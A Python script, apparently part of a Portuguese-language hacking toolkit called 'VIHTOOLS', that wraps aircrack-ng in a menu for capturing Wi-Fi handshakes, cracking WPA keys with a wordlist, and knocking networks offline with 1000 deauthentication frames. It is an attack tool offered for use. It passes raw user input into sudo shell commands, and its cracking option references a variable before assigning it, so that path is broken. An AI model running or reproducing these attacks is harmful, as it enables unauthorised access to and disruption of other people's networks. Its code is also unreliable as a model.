#AIRCRACK-NG

import os
from colorama import Fore, Style
import time
import subprocess
texto_vihtools = r"""
 ██▒   █▓ ██▓ ██░ ██ ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
▓██░   █▒▓██▒▓██░ ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒     ▒██    ▒ 
 ▓██  █▒░▒██▒▒██▀▀██░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░     ░ ▓██▄   
  ▒██ █░░░██░░▓█ ░██ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░       ▒   ██▒
   ▒▀█░  ░██░░▓█▒░██▓  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
   ░ ▐░  ░▓   ▒ ░░▒░▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
   ░ ░░   ▒ ░ ▒ ░▒░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
     ░░   ▒ ░ ░  ░░ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
      ░   ░   ░  ░  ░             ░ ░      ░ ░      ░  ░      ░  
"""

def aircrack():
    os.system('clear')
    print(Fore.RED + texto_vihtools + Style.RESET_ALL)
    print(Fore.WHITE + "Hacking Winreless - Aircrack-ng" + Style.RESET_ALL)
    print(Fore.WHITE + "Recursos do Aircrack-ng:" + Style.RESET_ALL)
    print(Fore.WHITE + "[1] Capturar pacotes" + Style.RESET_ALL)
    print(Fore.WHITE + "[2] Crackear rede" + Style.RESET_ALL)
    print(Fore.WHITE + "[3] Derrubar redes" + Style.RESET_ALL)
    print(Fore.WHITE + "[4] Voltar" + Style.RESET_ALL)

    user_aircrack = input(Fore.RED + "Digite o número do recurso que deseja utilizar: " + Style.RESET_ALL)

    def capturar_pacotes():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)

        user_placa_monitoramento = input(Fore.RED + "Digite sua placa da internet: " + Style.RESET_ALL)
        os.system(f'sudo airmon-ng start {user_placa_monitoramento}')

        print(Fore.WHITE + "Agora você irá esperar a rede alvo aparecer e depois: Control + C..." + Style.RESET_ALL)
        time.sleep(1)

        os.system(f'sudo airodump-ng {user_placa_monitoramento}')
        time.sleep(2)

        user_capturar_pacotes = input(Fore.RED + "Iniciar captura (s/n): " + Style.RESET_ALL)

        if user_capturar_pacotes.lower() == "s":
            bssid = input(Fore.RED + "Digite o bssid da rede: " + Style.RESET_ALL)
            ch = input(Fore.RED + "Digite o canal da rede: " + Style.RESET_ALL)

            print(Fore.WHITE + "Iniciando captura...")
            time.sleep(1)
            os.system(f'sudo airodump-ng --bssid {bssid} -c {ch} -w captura {user_placa_monitoramento}')
            time.sleep(2)

            print(Fore.WHITE + "Captura concluída!" + Style.RESET_ALL)
            os.system(f'sudo airmon-ng stop {user_placa_monitoramento}')
            
            user_menu = input(Fore.RED + "Voltar para o menu do Aircrack-ng (s/n): ")

            if user_menu.lower() == "s":
                aircrack()
            else:
                print(Fore.RED + "Saindo do Aircrack..." + Style.RESET_ALL)
                os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')

        else:
            aircrack()


    def crackear_rede():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)

        user_placa_monitoramento_crak = input(Fore.RED + "Digite sua placa da internet: " + Style.RESET_ALL)
        os.system(f'sudo airmon-ng start {user_placa_monitoramento_crak}')

        print(Fore.WHITE + "Agora você irá esperar a rede alvo aparecer e depois: Control + C..." + Style.RESET_ALL)
        time.sleep(1)

        os.system(f'sudo airodump-ng {user_placa_monitoramento_crak}')
        time.sleep(2)

        user_capturar_pacotes_crack = input(Fore.RED + "Iniciar captura (s/n): " + Style.RESET_ALL)
        print(Fore.WHITE + f"QUANDO A CAPTURA INICIAR, COLE ESTE COMANDO EM OUTRO TERMINAL E DEPOIS ENTER:sudo aireplay-ng -0 1000 -a {bssid_crack} {user_placa_monitoramento_crak}" + Style.RESET_ALL)       

        if user_capturar_pacotes_crack.lower() == "s":
            bssid_crack = input(Fore.RED + "Digite o bssid da rede: " + Style.RESET_ALL)
            ch_crack = input(Fore.RED + "Digite o canal da rede: " + Style.RESET_ALL)

            print(Fore.WHITE + "Iniciando captura...")
            time.sleep(1)
            os.system(f'sudo airodump-ng --bssid {bssid_crack} -c {ch_crack} -w captura {user_placa_monitoramento_crak}')
            time.sleep(2)


        #ataque
        user_crackear_rede = input(Fore.RED + "Iniciar ataque (s/n): " + Style.RESET_ALL)
        if user_crackear_rede.lower() == "s":
            os.system('clear')
            print(Fore.RED + texto_vihtools + Style.RESET_ALL)
            wordlist_user = input(Fore.RED + "Caminho da sua wordlist: " + Style.RESET_ALL)

            os.system(f'sudo aircrack-ng captura-01.cap -w {wordlist_user}')


            print(Fore.WHITE + "Crackeamento concluído!" + Style.RESET_ALL)
            os.system(f'sudo airmon-ng stop {user_placa_monitoramento_crak}')
            
            user_menu = input(Fore.RED + "Voltar para o menu do Aircrack-ng (s/n): ")

            if user_menu.lower() == "s":
                aircrack()
            else:
                print(Fore.RED + "Saindo do Aircrack..." + Style.RESET_ALL)
                os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')

        else:
            aircrack()


    def derrubar_redes():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)

        user_placa_monitoramento_derrubar = input(Fore.RED + "Digite sua placa da internet: " + Style.RESET_ALL)
        os.system(f'sudo airmon-ng start {user_placa_monitoramento_derrubar}')
        print(Fore.WHITE + "Agora você irá esperar a rede alvo aparecer e depois: Control + C..." + Style.RESET_ALL)
        time.sleep(1)

        os.system(f'sudo airodump-ng {user_placa_monitoramento_derrubar}')
        time.sleep(2)
        bssid_ataque = input(Fore.RED + "Digite o bssid da rede: " + Style.RESET_ALL)
        user_derrubar_redes = input(Fore.RED + "Iniciar ataque (s/n): " + Style.RESET_ALL)

        if user_derrubar_redes.lower() == "s":
            os.system(f'sudo aireplay-ng -0 1000 -a {bssid_ataque} {user_placa_monitoramento_derrubar}')

            print(Fore.WHITE + "Ataque concluído!" + Style.RESET_ALL)
            os.system(f'sudo airmon-ng stop {user_placa_monitoramento_derrubar}')
            
            user_menu = input(Fore.RED + "Voltar para o menu do Aircrack-ng (s/n): ")

            if user_menu.lower() == "s":
                aircrack()
            else:
                print(Fore.RED + "Saindo do Aircrack..." + Style.RESET_ALL)
                os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
        else:
            aircrack()

    if user_aircrack == "1":
        capturar_pacotes()
    elif user_aircrack == "2":
        crackear_rede()
    elif user_aircrack == "3":
        derrubar_redes()
    elif user_aircrack == "4":
        os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
    else:
        aircrack()

aircrack()


